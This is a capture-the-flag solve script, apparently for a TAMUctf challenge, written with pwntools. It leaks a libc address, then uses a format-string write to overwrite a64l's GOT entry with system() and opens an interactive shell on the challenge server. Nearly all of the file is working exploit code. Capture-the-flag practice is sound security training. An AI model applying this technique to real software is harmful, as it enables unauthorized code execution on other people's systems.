#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

./solve.py REMOTE HOST=challenges.tamuctf.com PORT=2783
"""

from __future__ import print_function

from pwn import *

PROG_PATH = './b64decoder'

A64L_GOT_ADDR = 0x804b398


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_solve_context():
    if args['REMOTE']:
        io = remote(args['HOST'], int(args['PORT']))
        libc = ELF('./libc.so.6')
    else:
        pty = process.PTY
        io = process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)
        libc = ELF('/lib32/libc.so.6')

    return io, libc


def win(io, libc):
    # Get address of a64l from program output.
    io.recvuntil('by a64l (')
    a64l_raw_addr = io.recvuntil(')\n', drop=True)
    a64l_addr = int(a64l_raw_addr, 16)

    # Update libc base address.
    libc.address = a64l_addr - libc.sym['a64l']
    log.info('Updated libc base address to 0x%x' % libc.address)
    log.info('libc a64l address: 0x%x' % a64l_addr)
    log.info('libc system address: 0x%x' % libc.sym['system'])

    # We only need to overwrite the last two bytes of the a64l GOT entry,
    # because it has already been resolved by the time we get to our printf
    # injection.

    # Build payload to overwrite a64l GOT entry with libc's system.
    payload = ''

    lower_word = (libc.sym['system'] - len(payload)) & 0xffff
    log.info('Attempting 2-byte overwrite of a64l GOT entry with 0x%x' %
             (libc.sym['system'] & 0xffff))

    # We have to account for how many digits we have to write, which should
    # be either 4 or 5 most of the time
    num_digits = len(str(lower_word))
    if num_digits == 4:
        padding = '  '
    elif num_digits == 5:
        padding = ' '
    else:
        log.error('Unexpected number of digits to write')

    payload += padding + '%' + str(lower_word-len(padding)-1) + 'p'
    payload += '|%75$hn|'

    # XXX: Below is not an issue, I'm dumb. We aren't actually writing any
    #      null bytes, the two-byte overwrite is encoded in format string's
    #      %NUMBERp clause. My exploit just wasn't working on remote because
    #      of a broken recvuntil condition...

    # libc system address on remote always ends with null-byte, so we have to
    # send the address as the last part of the format string.
    payload += p32(A64L_GOT_ADDR)

    log.info('Payload minus a64l GOT address is: %s' % payload)
    log.info('Total payload length is %i' % len(payload))

    # Send the payload and call system('sh').
    io.recvuntil('name!  \n')
    io.sendline(payload)
    io.sendline('sh')
    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io, libc = init_solve_context()

    if args['PAUSE']:
        pause()

    win(io, libc)
